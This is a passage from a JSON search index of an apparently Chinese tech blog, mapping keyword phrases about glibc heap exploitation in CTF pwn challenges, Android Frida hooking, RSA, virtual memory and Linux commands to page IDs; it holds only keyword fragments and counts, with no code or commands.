}],[\"相当于遍历\",{\"1\":{\"125\":1}}],[\"相当于向java层提供了一个callback函数\",{\"1\":{\"120\":1}}],[\"链子\",{\"1\":{\"491\":1}}],[\"链接部分\",{\"0\":{\"415\":1}}],[\"链接已经关闭\",{\"1\":{\"255\":1}}],[\"链接与库\",{\"0\":{\"95\":1,\"235\":1}}],[\"链接\",{\"0\":{\"133\":1},\"1\":{\"87\":1,\"227\":1}}],[\"处于使用状态\",{\"1\":{\"491\":1}}],[\"处理\",{\"0\":{\"21\":1,\"163\":1}}],[\"任意free\",{\"1\":{\"490\":1}}],[\"任何一个软件模块都应该只对一类行为者负责\",{\"1\":{\"252\":1}}],[\"三个chunk\",{\"1\":{\"488\":1}}],[\"三种情况下会被自动触发\",{\"1\":{\"423\":1}}],[\"造成one\",{\"1\":{\"487\":1}}],[\"造成prev\",{\"1\":{\"368\":1}}],[\"白给\",{\"1\":{\"485\":1}}],[\"十进制或十六进制\",{\"1\":{\"484\":1}}],[\"十分好用的技巧\",{\"1\":{\"57\":1,\"197\":1}}],[\"十分浪费性能\",{\"1\":{\"12\":1,\"154\":1}}],[\"尝试fork一个新进程\",{\"1\":{\"483\":1}}],[\"尝试覆盖\",{\"0\":{\"471\":1}}],[\"甚至去想办法触发新的mmap函数来获取一个低地址的可执行区域\",{\"1\":{\"483\":1}}],[\"禁止了orw的orw\",{\"1\":{\"483\":1}}],[\"禁用了\",{\"1\":{\"40\":1,\"180\":1}}],[\"禁用了execve或者system\",{\"1\":{\"40\":1,\"180\":1}}],[\"概率还挺大\",{\"1\":{\"480\":1}}],[\"选择\",{\"0\":{\"478\":1}}],[\"选择两个大素数p和q典型值为1024位\",{\"1\":{\"240\":1}}],[\"成功构造fake\",{\"1\":{\"491\":1}}],[\"成功泄露\",{\"1\":{\"475\":1}}],[\"成功返回0\",{\"1\":{\"43\":1,\"183\":1}}],[\"删除一个index\",{\"1\":{\"475\":1}}],[\"好像还是不太对\",{\"1\":{\"470\":1}}],[\"►\",{\"1\":{\"470\":1}}],[\"更改\",{\"1\":{\"466\":1}}],[\"制表符和换行符\",{\"1\":{\"466\":1}}],[\"适用于高级用户\",{\"1\":{\"464\":1}}],[\"便于查看和编辑文件\",{\"1\":{\"464\":1}}],[\"个字节\",{\"1\":{\"464\":1}}],[\"个人在开发的时候其实遇到了很多的问题\",{\"1\":{\"245\":1}}],[\"行\",{\"1\":{\"464\":1}}],[\"例如\",{\"1\":{\"464\":2}}],[\"默许情况下显示文件的最后10行\",{\"1\":{\"464\":1}}],[\"默许情况下显示前10行\",{\"1\":{\"464\":1}}],[\"默认情况下\",{\"1\":{\"464\":2,\"466\":1}}],[\"默认值64\",{\"1\":{\"347\":1}}],[\"默认值为\",{\"1\":{\"284\":1}}],[\"默认activity标志\",{\"0\":{\"144\":1}}],[\"默认activity\",{\"0\":{\"142\":1}}],[\"退出\",{\"1\":{\"464\":1}}],[\"逐行滚动\",{\"1\":{\"464\":1}}],[\"键盘操作\",{\"1\":{\"464\":1}}],[\"屏幕上显示的文本不会被清除\",{\"1\":{\"464\":1}}],[\"长行将不会被折行\",{\"1\":{\"464\":1}}],[\"长连接的通讯模式\",{\"1\":{\"435\":1}}],[\"搜索关键字等\",{\"1\":{\"464\":1}}],[\"经常使用于查看文本文件的内容\",{\"1\":{\"464\":1}}],[\"经历了promise过程后future将会塞入返回值\",{\"1\":{\"280\":1}}],[\"拿这玩意丢进虚拟机里面跑了一下\",{\"1\":{\"463\":1}}],[\"拿出来\",{\"1\":{\"73\":1,\"213\":1,\"317\":1}}],[\"丢进ida里面没用\",{\"1\":{\"463\":1}}],[\"丢入则得到d和k\",{\"1\":{\"242\":1}}],[\"反调试知道了\",{\"1\":{\"462\":1}}],[\"反方向循环\",{\"1\":{\"321\":1}}],[\"动调\",{\"0\":{\"461\":1}}],[\"动态链接器解析程序中的符号引用\",{\"1\":{\"454\":1}}],[\"动态链接器查找这些共享库的位置\",{\"1\":{\"454\":1}}],[\"动态链接器检查程序的头部\",{\"1\":{\"454\":1}}],[\"动态链接库顺序\",{\"1\":{\"452\":1}}],[\"动态内存映射区\",{\"1\":{\"16\":1,\"158\":1}}],[\"真实情况我们以动调为标准\",{\"1\":{\"460\":1}}],[\"几乎每个函数都是长这个样子的\",{\"1\":{\"460\":1}}],[\"时\",{\"1\":{\"464\":1}}],[\"时创建线程的返回值\",{\"1\":{\"458\":1}}],[\"时间\",{\"1\":{\"255\":1}}],[\"地址\",{\"0\":{\"456\":1}}],[\"地址后面的内容会被当成栈\",{\"1\":{\"446\":1}}],[\"符号解析\",{\"1\":{\"454\":1}}],[\"符号索引\",{\"1\":{\"449\":1}}],[\"陷入系统内核操作\",{\"1\":{\"454\":1}}],[\"陷阱\",{\"1\":{\"20\":1,\"162\":1}}],[\"转化为32位\",{\"1\":{\"483\":1}}],[\"转\",{\"1\":{\"452\":1}}],[\"省略点将\",{\"1\":{\"451\":1}}],[\"放入\",{\"1\":{\"449\":1}}],[\"恢复原始的返回地址\",{\"1\":{\"449\":1}}],[\"恢复第一个参数\",{\"1\":{\"449\":1}}],[\"恢复第二个参数\",{\"1\":{\"449\":1}}],[\"恢复寄存器\",{\"1\":{\"449\":1}}],[\"传递\",{\"1\":{\"449\":1}}],[\"传输数据之前都是必须创建链接的\",{\"1\":{\"433\":1}}],[\"注意一下每个指令之间执行的间距就可以了\",{\"1\":{\"505\":1}}],[\"注意\",{\"1\":{\"449\":1}}],[\"注册事件\",{\"1\":{\"279\":1}}],[\"注册一个轮询事件\",{\"1\":{\"43\":1,\"183\":1}}],[\"注册的资源\",{\"1\":{\"43\":1,\"183\":1}}],[\"换句话说\",{\"1\":{\"446\":1}}],[\"换句话说就是该数除了1和它本身以外不再有其他的因数\",{\"1\":{\"240\":1}}],[\"确保它们指向正确的地址\",{\"1\":{\"454\":1}}],[\"确实重要\",{\"1\":{\"444\":1}}],[\"确定密文是否被修改过\",{\"1\":{\"243\":1}}],[\"头\",{\"1\":{\"441\":1}}],[\"依次向右取值\",{\"1\":{\"440\":1}}],[\"依赖倒置\",{\"1\":{\"252\":2}}],[\"依赖关系混乱\",{\"1\":{\"245\":1}}],[\"依赖于段选择子也就是段寄存器\",{\"1\":{\"64\":1,\"204\":1}}],[\"间距0x280\",{\"1\":{\"440\":1}}],[\"特别详细和好理解\",{\"1\":{\"438\":1}}],[\"占满tcache\",{\"1\":{\"491\":1}}],[\"占满tacache\",{\"1\":{\"302\":1}}],[\"占用的已经删除\",{\"1\":{\"488\":1}}],[\"占用的page数等\",{\"1\":{\"438\":1}}],[\"缓存的chunk数\",{\"1\":{\"438\":1}}],[\"缓存的chunk链表\",{\"1\":{\"438\":1}}],[\"缓冲区溢出分析示例\",{\"1\":{\"49\":1,\"189\":1}}],[\"缓冲区等\",{\"1\":{\"43\":1,\"183\":1}}],[\"单链表\",{\"1\":{\"438\":1}}],[\"单一职责\",{\"1\":{\"252\":2}}],[\"单一时间只能执行一种指令\",{\"1\":{\"14\":1,\"156\":1}}],[\"很方便理解\",{\"1\":{\"433\":1}}],[\"很容易出现各个模块直接进行随意的函数调用\",{\"1\":{\"245\":1}}],[\"条消息\",{\"1\":{\"432\":1}}],[\"条件\",{\"0\":{\"383\":1,\"426\":1}}],[\"封私信\",{\"1\":{\"432\":1}}],[\"封装\",{\"1\":{\"252\":1}}],[\"封装与应用程序业务逻辑相关的数据以及对数据的处理方法\",{\"1\":{\"247\":1}}],[\"验证虚表指针\",{\"1\":{\"428\":1}}],[\"防御机制\",{\"0\":{\"427\":1}}],[\"防止fastbin合并后直接被topchunk合并\",{\"1\":{\"376\":1,\"498\":1}}],[\"防止double\",{\"1\":{\"338\":1}}],[\"宽字符数据的写入缓冲区中有待写入的数据\",{\"1\":{\"426\":1}}],[\"虚函数表指针在\",{\"1\":{\"428\":1}}],[\"虚表偏移量为0\",{\"1\":{\"426\":1}}],[\"虚拟地址转化为线性地址\",{\"0\":{\"64\":1,\"204\":1}}],[\"虚拟地址\",{\"1\":{\"63\":1,\"203\":1}}],[\"虚拟地址的cow\",{\"0\":{\"11\":1,\"153\":1}}],[\"虚拟空间连续\",{\"1\":{\"10\":1,\"152\":1}}],[\"虚拟内存管理技术\",{\"1\":{\"16\":1,\"158\":1}}],[\"虚拟内存管理中的写时复制\",{\"1\":{\"9\":1,\"151\":1}}],[\"虚拟内存概念及分页机制\",{\"1\":{\"10\":1,\"152\":1}}],[\"虚拟内存\",{\"0\":{\"10\":1,\"152\":1}}],[\"太笨了\",{\"1\":{\"470\":1}}],[\"太长了\",{\"1\":{\"420\":1}}],[\"太多了\",{\"1\":{\"131\":1}}],[\"满足好奇心\",{\"1\":{\"414\":1}}],[\"满足以上条件\",{\"1\":{\"313\":1}}],[\"扩展的实现原理\",{\"1\":{\"437\":1}}],[\"扩展开发\",{\"1\":{\"437\":1}}],[\"扩展\",{\"1\":{\"408\":1}}],[\"扩展欧几里得算法\",{\"1\":{\"240\":1,\"242\":1}}],[\"扩展欧几里得\",{\"1\":{\"240\":1}}],[\"部分前置知识讲解\",{\"0\":{\"448\":1}}],[\"部分\",{\"0\":{\"406\":1}}],[\"部分页表项成为空洞\",{\"1\":{\"10\":1,\"152\":1}}],[\"假如之前\",{\"1\":{\"403\":1}}],[\"假如没有内存对齐机制\",{\"1\":{\"12\":1,\"154\":1}}],[\"暂时不搬出来了\",{\"1\":{\"400\":1}}],[\"倒不如说它就是文件流\",{\"1\":{\"400\":1}}],[\"创建unsortedbin大小占满\",{\"1\":{\"491\":1}}],[\"创建了一个index\",{\"1\":{\"475\":1}}],[\"创建\",{\"1\":{\"400\":1}}],[\"创建一个非主分配区\",{\"1\":{\"353\":1}}],[\"创建一个新进程的时候\",{\"1\":{\"78\":1,\"218\":1}}],[\"创建一个新的对象进行存储\",{\"1\":{\"30\":1,\"172\":1}}],[\"创建一个管道\",{\"1\":{\"42\":1,\"182\":1}}],[\"叫做文件流\",{\"1\":{\"400\":1}}],[\"请输入要查看内容的内存块名字\",{\"1\":{\"484\":1}}],[\"请输入大小\",{\"1\":{\"484\":1}}],[\"请输入名字\",{\"1\":{\"484\":1}}],[\"请记住和指针常量的区别\",{\"1\":{\"399\":1}}],[\"请求检查函数\",{\"1\":{\"254\":1}}],[\"核心l\",{\"1\":{\"421\":1}}],[\"核心结构体\",{\"0\":{\"399\":1}}],[\"核心还是劫持vtable\",{\"1\":{\"393\":1}}],[\"整体脉络\",{\"1\":{\"398\":1}}],[\"整个利用原理不算难但是细节很多很多地方需要微调\",{\"1\":{\"372\":1,\"494\":1}}],[\"感觉较为复杂\",{\"1\":{\"398\":1}}],[\"总是打印每个文件的名称作为头部\",{\"1\":{\"464\":1}}],[\"总大小512bit\",{\"1\":{\"438\":1}}],[\"总结就是\",{\"1\":{\"396\":1}}],[\"总感觉比较难记住\",{\"1\":{\"308\":1}}],[\"偏移0xf0\",{\"1\":{\"388\":1}}],[\"伪造\",{\"1\":{\"384\":1}}],[\"伪造fake\",{\"0\":{\"374\":1,\"496\":1},\"1\":{\"372\":1,\"494\":1}}],[\"示例\",{\"1\":{\"449\":1}}],[\"示例程序\",{\"1\":{\"382\":1}}],[\"示意图\",{\"0\":{\"375\":1,\"392\":1,\"396\":1,\"497\":1},\"1\":{\"366\":1,\"367\":1,\"368\":1}}],[\"填写binsh只是为了后续调用system函数的时候可以找个地址来当作参数\",{\"1\":{\"380\":1,\"502\":1}}],[\"绕过也很简单泄露heap地址即可\",{\"1\":{\"379\":1,\"501\":1}}],[\"绕过检查\",{\"1\":{\"345\":1}}],[\"^我想要构造的fd\",{\"1\":{\"491\":1}}],[\"^=\",{\"1\":{\"459\":1,\"461\":1,\"462\":1}}],[\"^exit\",{\"1\":{\"380\":1,\"502\":1}}],[\"^\",{\"1\":{\"378\":2,\"462\":1,\"500\":2,\"503\":1}}],[\"才看见代码\",{\"1\":{\"463\":1}}],[\"才是合法的fd才能够被正常解析\",{\"1\":{\"378\":1,\"500\":1}}],[\"才会放入fastbin\",{\"1\":{\"285\":1}}],[\"才会进行拷贝\",{\"1\":{\"17\":1,\"159\":1}}],[\"才会为这个页面创建一个新的副本\",{\"1\":{\"16\":1,\"158\":1}}],[\"难点\",{\"1\":{\"378\":1,\"380\":1,\"500\":1,\"502\":1}}],[\"剩下0xf3c7d0\",{\"1\":{\"376\":1,\"498\":1}}],[\"剩下就是normal区域\",{\"1\":{\"70\":1,\"210\":1}}],[\"彻底消耗topchunk\",{\"1\":{\"376\":1,\"498\":1}}],[\"彻底弄懂\",{\"1\":{\"15\":1,\"157\":1}}],[\"控制bss\",{\"1\":{\"475\":1}}],[\"控制fd\",{\"1\":{\"475\":1}}],[\"控制内容chunk刚好为原本某一个的头chunk\",{\"1\":{\"374\":1,\"496\":1}}],[\"控制malloc到的数据\",{\"1\":{\"53\":1,\"193\":1}}],[\"泄露heap\",{\"1\":{\"503\":1}}],[\"泄露heap地址\",{\"1\":{\"383\":1,\"487\":1}}],[\"泄露出标准io地址从而推算出libc地址\",{\"1\":{\"474\":1}}],[\"泄露出chunk\",{\"1\":{\"373\":1,\"495\":1,\"503\":1}}],[\"泄露tls中信息\",{\"1\":{\"378\":1,\"500\":1}}],[\"泄露tls+0x30\",{\"0\":{\"378\":1,\"500\":1}}],[\"泄露libc地址\",{\"1\":{\"361\":1}}],[\"泄露libc\",{\"0\":{\"355\":1,\"373\":1,\"495\":1},\"1\":{\"372\":1,\"494\":1}}],[\"劫持bss段数据\",{\"1\":{\"490\":1}}],[\"劫持head\",{\"0\":{\"490\":1}}],[\"劫持freechunk\",{\"0\":{\"488\":1}}],[\"劫持exit\",{\"0\":{\"380\":1,\"502\":1}}],[\"劫持\",{\"1\":{\"372\":1,\"494\":1}}],[\"改为0x800\",{\"1\":{\"397\":1}}],[\"改写isused和buff指针\",{\"1\":{\"372\":1,\"494\":1}}],[\"改默认启动activity\",{\"1\":{\"140\":1}}],[\"消耗topchunk到size为一个较小值\",{\"1\":{\"376\":1,\"498\":1}}],[\"消耗topchunk触发fastbin的合并\",{\"1\":{\"372\":1,\"494\":1}}],[\"消息队列\",{\"0\":{\"98\":1}}],[\"审题\",{\"0\":{\"371\":1,\"493\":1}}],[\"刚好四字节\",{\"1\":{\"482\":1}}],[\"刚好对上一个chunk\",{\"1\":{\"368\":1}}],[\"刚好0x8的空间\",{\"1\":{\"330\":1}}],[\"覆写数据\",{\"0\":{\"388\":1}}],[\"覆写chunk0的fd\",{\"1\":{\"366\":1}}],[\"覆盖上我们想要修改的地址\",{\"1\":{\"388\":1}}],[\"覆盖vatble\",{\"0\":{\"385\":1}}],[\"覆盖原有的进程\",{\"1\":{\"67\":1,\"207\":1}}],[\"变成\",{\"1\":{\"491\":1}}],[\"变成对应的文件描述符了\",{\"1\":{\"420\":1}}],[\"变量\",{\"1\":{\"466\":1}}],[\"变量的指针\",{\"1\":{\"458\":1}}],[\"变化\",{\"1\":{\"411\":1,\"417\":1,\"420\":1}}],[\"变为allocted\",{\"1\":{\"365\":1,\"369\":1}}],[\"变得强大\",{\"1\":{\"1\":1}}],[\"合适查看大文件\",{\"1\":{\"464\":1}}],[\"合法的chunk\",{\"1\":{\"365\":1,\"369\":1}}],[\"合并chunk\",{\"1\":{\"488\":1}}],[\"合并后\",{\"1\":{\"376\":1,\"498\":1}}],[\"合并后会被放入unsorted\",{\"1\":{\"284\":1}}],[\"合并之前\",{\"1\":{\"376\":1,\"498\":1}}],[\"合并机制来修改\",{\"1\":{\"367\":1}}],[\"合并\",{\"1\":{\"365\":1}}],[\"合并时对prev\",{\"1\":{\"303\":1}}],[\"悲\",{\"1\":{\"360\":1}}],[\"或\",{\"1\":{\"464\":16}}],[\"或main\",{\"1\":{\"357\":1}}],[\"或者文件名为\",{\"1\":{\"464\":1}}],[\"或者通过向scanf输入大量数据触发fastbin合并\",{\"1\":{\"372\":1,\"494\":1}}],[\"或者当前chunk的fd是否是bin的头结点\",{\"1\":{\"312\":1}}],[\"或者任何一个我们我们想控制的空间\",{\"1\":{\"306\":1}}],[\"或者是其他容易变动的事物名字\",{\"1\":{\"252\":1}}],[\"或者其他层级负责权限控制等东西\",{\"1\":{\"252\":1}}],[\"显示文件开始的指定字节数\",{\"1\":{\"464\":1}}],[\"显示文件开始的指定行数\",{\"1\":{\"464\":1}}],[\"显示帮助信息\",{\"1\":{\"464\":1}}],[\"显示控制字符\",{\"1\":{\"464\":1}}],[\"显示百分比表示的文件位置\",{\"1\":{\"464\":1}}],[\"显示更详细的提示信息\",{\"1\":{\"464\":1}}],[\"显示每行的行号\",{\"1\":{\"464\":1}}],[\"显示屏b\",{\"1\":{\"250\":1}}],[\"显然第一种我们是没办法直接申请large\",{\"1\":{\"376\":1,\"498\":1}}],[\"显然不足以超过tcache\",{\"1\":{\"357\":1}}],[\"引入了tcache并且没有引入bk随机数安全检查机制\",{\"1\":{\"357\":1}}],[\"引入了seccomp\",{\"1\":{\"41\":1,\"181\":1}}],[\"题目中存在off\",{\"1\":{\"361\":1}}],[\"题目\",{\"0\":{\"356\":1}}],[\"虽然这个思路失败了\",{\"1\":{\"355\":1}}],[\"虽然之前也是copy\",{\"1\":{\"330\":1}}],[\"什么都pwn只会害了你\",{\"1\":{\"355\":1}}],[\"移除free\",{\"1\":{\"353\":1}}],[\"移动链表地址\",{\"1\":{\"353\":1}}],[\"解释数据的方式\",{\"1\":{\"466\":1}}],[\"解释部分函数\",{\"0\":{\"458\":1}}],[\"解析依赖\",{\"1\":{\"454\":1}}],[\"解除分配区锁\",{\"1\":{\"353\":1}}],[\"解压文件系统\",{\"1\":{\"73\":1,\"213\":1}}],[\"å\",{\"1\":{\"353\":1}}],[\"空闲\",{\"1\":{\"347\":1}}],[\"空闲链表的状态记录\",{\"1\":{\"347\":1}}],[\"表示结束地址\",{\"1\":{\"430\":1}}],[\"表示操作的起始地址\",{\"1\":{\"430\":1}}],[\"表示文件不可写\",{\"1\":{\"426\":1}}],[\"表示bin数组当中某一个下标的bin是否为空\",{\"1\":{\"347\":1}}],[\"表中记录正在使用的chunk才是合法的\",{\"1\":{\"55\":1,\"195\":1}}],[\"全局malloc状态管理\",{\"1\":{\"347\":1}}],[\"全书学习笔记\",{\"1\":{\"3\":1,\"146\":1}}],[\"讲得很清晰\",{\"1\":{\"346\":1}}],[\"讲解得很仔细\",{\"1\":{\"63\":1,\"203\":1}}],[\"推荐这个网站进行查看有哪些函数和传参规范\",{\"1\":{\"483\":1}}],[\"推荐\",{\"1\":{\"346\":1}}],[\"看下面的解释\",{\"1\":{\"491\":1}}],[\"看下一个chunk的prev\",{\"1\":{\"344\":1}}],[\"看一下题发现应该是比较简单的\",{\"1\":{\"469\":1}}],[\"看名字就应该差不多能推断出来是一个线程创建函数\",{\"1\":{\"458\":1}}],[\"看上去应该是简单的hh\",{\"1\":{\"457\":1}}],[\"看雪\",{\"1\":{\"46\":1,\"132\":1,\"186\":1,\"256\":1,\"372\":1,\"382\":1,\"393\":1,\"397\":1,\"494\":1}}],[\"仅高亮显示最后一次搜索匹配的字符串\",{\"1\":{\"464\":1}}],[\"仅伪造\",{\"1\":{\"396\":1}}],[\"仅仅是检查bin中第一个chunk是否是相同的chunk\",{\"1\":{\"339\":1}}],[\"仅新的commit会被合并\",{\"1\":{\"275\":1}}],[\"记录内容chunk的size\",{\"1\":{\"374\":1,\"496\":1}}],[\"记住是我们想要写入地址\",{\"1\":{\"339\":1}}],[\"记一次patchelf的使用+浅理解ld和libc\",{\"0\":{\"452\":1}}],[\"记一次失败的unsoretedbin\",{\"0\":{\"355\":1}}],[\"记一次高版本glibc\",{\"0\":{\"299\":1}}],[\"记一次删除commit操作\",{\"0\":{\"271\":1}}],[\"运行和终止流程\",{\"1\":{\"452\":1}}],[\"运行plt\",{\"1\":{\"449\":2}}],[\"运行\",{\"1\":{\"335\":1,\"336\":1}}],[\"运行images\",{\"1\":{\"258\":1}}],[\"了解\",{\"0\":{\"332\":1}}],[\"了解知识点\",{\"0\":{\"239\":1}}],[\"保护\",{\"1\":{\"469\":1}}],[\"保护模式就是通过段机制\",{\"1\":{\"65\":1,\"205\":1}}],[\"保护模式\",{\"0\":{\"65\":1,\"205\":1}}],[\"保存第二个参数\",{\"1\":{\"449\":1}}],[\"保存第一个参数\",{\"1\":{\"449\":1}}],[\"保存原始的返回地址\",{\"1\":{\"449\":1}}],[\"保存寄存器\",{\"1\":{\"449\":1}}],[\"保留最基本结构\",{\"1\":{\"329\":1}}],[\"两字节\",{\"1\":{\"482\":1}}],[\"两次栈溢出\",{\"1\":{\"481\":1}}],[\"两个fastbin情况\",{\"1\":{\"475\":1}}],[\"两个chunk会合并为一个较大的chunk\",{\"1\":{\"329\":1}}],[\"两种我们的提取方式不同\",{\"1\":{\"73\":1,\"213\":1}}],[\"需要\",{\"1\":{\"491\":1}}],[\"需要实际实现\",{\"1\":{\"449\":1}}],[\"需要了解的参考这个文章\",{\"1\":{\"449\":1}}],[\"需要注意的是\",{\"1\":{\"329\":1}}],[\"需要从unsrotedbin中取chunk的时候\",{\"1\":{\"57\":1,\"197\":1}}],[\"含amp\",{\"1\":{\"329\":1}}],[\"含卸载方法\",{\"1\":{\"262\":1}}],[\"完整的chunk\",{\"1\":{\"329\":1}}],[\"完成回音\",{\"1\":{\"254\":1}}],[\"完成类似于初始化的操作比如现在我有类student那么我在student\",{\"1\":{\"124\":1}}],[\"完成通知\",{\"1\":{\"43\":1,\"183\":1}}],[\"随便写的位置\",{\"1\":{\"505\":1}}],[\"随缘更新\",{\"1\":{\"326\":1}}],[\"随着代码的累积发现后面程序就积重难返了\",{\"1\":{\"245\":1}}],[\"学pwn日记\",{\"1\":{\"326\":1}}],[\"学习路线\",{\"0\":{\"298\":1},\"1\":{\"298\":1}}],[\"学习经验\",{\"1\":{\"128\":1}}],[\"学习文章\",{\"0\":{\"140\":1},\"1\":{\"79\":1,\"132\":1,\"219\":1,\"272\":1,\"285\":1,\"295\":1,\"393\":1,\"436\":1}}],[\"做hgame的时候\",{\"1\":{\"326\":1}}],[\"阅读前后逻辑我们知道这段代码中bck=fwd\",{\"1\":{\"325\":1}}],[\"危险的地方在于\",{\"1\":{\"325\":1}}],[\"属于tcp\",{\"1\":{\"433\":1}}],[\"属于largebin大小则设置fd\",{\"1\":{\"324\":1}}],[\"属性分别对应\",{\"1\":{\"371\":1,\"493\":1}}],[\"属性定义了我们的一些系统行为\",{\"1\":{\"143\":1}}],[\"算出libc\",{\"1\":{\"475\":1}}],[\"算出下一个chunk的size\",{\"1\":{\"324\":1}}],[\"算一下偏差就可以了\",{\"1\":{\"474\":1}}],[\"算是一个正式的攻击手段\",{\"1\":{\"339\":1}}],[\"算剩余的remainder\",{\"1\":{\"321\":1}}],[\"清空要free的chunk\",{\"1\":{\"324\":1}}],[\"清空chunk中除了prev\",{\"1\":{\"324\":1}}],[\"塞入unsortedbin中\",{\"1\":{\"324\":1}}],[\"插入到\",{\"1\":{\"324\":1}}],[\"得小于该区域分配的最大size\",{\"1\":{\"324\":1}}],[\"得大于chunk最小值\",{\"1\":{\"324\":1}}],[\"得到d\",{\"1\":{\"243\":1}}],[\"得到下标如果下标一致\",{\"1\":{\"25\":1,\"167\":1}}],[\"避免我们修改chunk\",{\"1\":{\"321\":1}}],[\"避免程序出现内存泄漏等问题\",{\"1\":{\"4\":1,\"147\":1}}],[\"取\",{\"1\":{\"321\":1}}],[\"取得unsorted\",{\"1\":{\"321\":1}}],[\"取首个大于所需的chunk\",{\"1\":{\"321\":1}}],[\"取largebin的最后一个chunk\",{\"1\":{\"321\":1}}],[\"取最小的chunk\",{\"1\":{\"321\":1}}],[\"取消一个future\",{\"1\":{\"280\":1}}],[\"匹配第一个小于等于\",{\"1\":{\"319\":1}}],[\"否则\",{\"1\":{\"503\":1}}],[\"否则通过next遍历链表查看有未加锁分配区\",{\"1\":{\"349\":1}}],[\"否则将合并后的放入对应bin\",{\"1\":{\"330\":1}}],[\"否则进行遍历判断\",{\"1\":{\"319\":1}}],[\"否则称为合数\",{\"1\":{\"240\":1}}],[\"首个是main\",{\"1\":{\"343\":1}}],[\"首个chunk赋值给fwd\",{\"1\":{\"318\":1}}],[\"首先我们看一下\",{\"1\":{\"368\":1}}],[\"首先libc版本为2\",{\"1\":{\"357\":1}}],[\"首先获取p的size然后去找到下一个chunk\",{\"1\":{\"344\":1}}],[\"首先这是初始状态\",{\"1\":{\"319\":1}}],[\"首先是依靠这个指令来实现把rbp寄存器值变为我们希望的一个地址\",{\"1\":{\"446\":1}}],[\"首先是通过一次largebin劫持\",{\"1\":{\"384\":1}}],[\"首先是在fastbin上构造出两个以上的chunk\",{\"1\":{\"378\":1,\"500\":1}}],[\"首先是判断情况\",{\"1\":{\"321\":1}}],[\"首先是add\",{\"1\":{\"301\":1}}],[\"首先是tcahe是单链表结构\",{\"1\":{\"285\":1}}],[\"首先\",{\"1\":{\"286\":1,\"324\":1}}],[\"首先会被放到\",{\"1\":{\"284\":1}}],[\"首先在32位操作系统中内核虚拟内存和进程虚拟内存是无缝衔接的\",{\"1\":{\"70\":1,\"210\":1}}],[\"首先使用\",{\"1\":{\"43\":1,\"183\":1}}],[\"入unsortedbin\",{\"1\":{\"321\":1}}],[\"入bin链和chunk\",{\"0\":{\"319\":1}}],[\"入small链表或者large链表的操作\",{\"1\":{\"316\":1}}],[\"入链\",{\"0\":{\"309\":1}}],[\"归类入链操作\",{\"0\":{\"316\":1}}],[\"且不为top\",{\"1\":{\"324\":1}}],[\"且不是mmap分配的\",{\"1\":{\"324\":1}}],[\"且tcache未满则将chunk放入tcache中\",{\"1\":{\"315\":1}}],[\"且e与φ\",{\"1\":{\"240\":1}}],[\"正式做题\",{\"0\":{\"459\":1}}],[\"正式入链\",{\"1\":{\"324\":1}}],[\"正常设置size\",{\"1\":{\"324\":1}}],[\"正在使用中\",{\"1\":{\"347\":1}}],[\"正在使用\",{\"1\":{\"312\":1}}],[\"正如一个进程可以拥有多个线程一样\",{\"1\":{\"23\":1,\"165\":1}}],[\"获得指向内存空间中当前\",{\"1\":{\"312\":1}}],[\"获取一个大chunk装了heap\",{\"1\":{\"491\":1}}],[\"获取一个异常\",{\"1\":{\"280\":1}}],[\"获取数据\",{\"1\":{\"470\":1}}],[\"获取结果\",{\"1\":{\"470\":1}}],[\"获取目前程序的ld和libc的路径信息\",{\"1\":{\"455\":1}}],[\"获取目前加载的class\",{\"1\":{\"134\":1}}],[\"获取linux加载程序的流程\",{\"1\":{\"452\":1}}],[\"获取vtable\",{\"1\":{\"428\":1}}],[\"获取key的值\",{\"1\":{\"380\":1,\"502\":1}}],[\"获取失败的情况\",{\"1\":{\"352\":1}}],[\"获取了chunk2然后此时链表\",{\"1\":{\"339\":1}}],[\"获取对应大小的fastbin然后获取位置\",{\"1\":{\"336\":1}}],[\"获取对应大小的fastbin\",{\"1\":{\"335\":1}}],[\"获取对应fastbin链\",{\"1\":{\"324\":1}}],[\"获取上一个chunk的头指针\",{\"1\":{\"324\":1}}],[\"获取prev\",{\"1\":{\"324\":1}}],[\"获取物理上下一个chunk的大小\",{\"1\":{\"324\":1}}],[\"获取size大小\",{\"1\":{\"324\":1}}],[\"获取fp\",{\"0\":{\"424\":1}}],[\"获取fastbin的位置\",{\"1\":{\"335\":1}}],[\"获取fd与bk\",{\"1\":{\"296\":1}}],[\"获取future的值\",{\"1\":{\"280\":1}}],[\"获取包名\",{\"0\":{\"130\":1}}],[\"获取类的所有方法\",{\"1\":{\"126\":1}}],[\"获取某个重载函数的全部数量\",{\"1\":{\"123\":1}}],[\"获取java类\",{\"1\":{\"121\":1,\"123\":2,\"124\":1,\"125\":1}}],[\"获取指定的java类\",{\"0\":{\"121\":1}}],[\"获取函数的名字\",{\"1\":{\"36\":1,\"176\":1}}],[\"获取elf\",{\"1\":{\"36\":1,\"176\":1}}],[\"物理意义上的紧挨着\",{\"1\":{\"312\":1}}],[\"物理内存的机器上\",{\"1\":{\"71\":1,\"211\":1}}],[\"◂\",{\"1\":{\"311\":16,\"470\":2,\"491\":2}}],[\"▸\",{\"1\":{\"311\":34,\"491\":5}}],[\"没调用scanf之前\",{\"1\":{\"431\":1}}],[\"没执行\",{\"1\":{\"403\":2,\"407\":1}}],[\"没锁就能用\",{\"1\":{\"354\":1}}],[\"没有成功则通过arena\",{\"1\":{\"351\":1}}],[\"没很确定是否unsortedbin可不可以指向自己\",{\"1\":{\"310\":1}}],[\"没找到一个对象就会触发这个callback\",{\"1\":{\"125\":1}}],[\"梦的开始\",{\"0\":{\"310\":1}}],[\"遍历的开始\",{\"0\":{\"310\":1}}],[\"遍历完成后调用oncomplete\",{\"1\":{\"125\":1}}],[\"想成了利用retfq来转化为32位绕过open等函数的禁止\",{\"1\":{\"483\":1}}],[\"想要了解对应部分就直接点击标题跳转即可第一次阅读glibc的源码然后进行分析\",{\"1\":{\"307\":1}}],[\"想着不会出多大问题\",{\"1\":{\"245\":1}}],[\"持续更新\",{\"1\":{\"307\":1}}],[\"持久层\",{\"1\":{\"252\":1}}],[\"漏洞利用\",{\"0\":{\"325\":1}}],[\"漏洞利用图\",{\"0\":{\"306\":1}}],[\"漏洞学习\",{\"0\":{\"294\":1}}],[\"源码阅读\",{\"1\":{\"398\":1}}],[\"源码分析\",{\"0\":{\"308\":1,\"335\":1},\"1\":{\"307\":1}}],[\"源码级调试glibc\",{\"1\":{\"307\":2}}],[\"源码\",{\"0\":{\"305\":1,\"324\":1,\"407\":1,\"410\":1,\"413\":1,\"416\":1,\"419\":1}}],[\"抛开tcache部分\",{\"1\":{\"304\":1}}],[\"失败原因\",{\"0\":{\"303\":1}}],[\"失血模型\",{\"0\":{\"252\":1},\"1\":{\"252\":2}}],[\"连续申请大量chunk\",{\"1\":{\"376\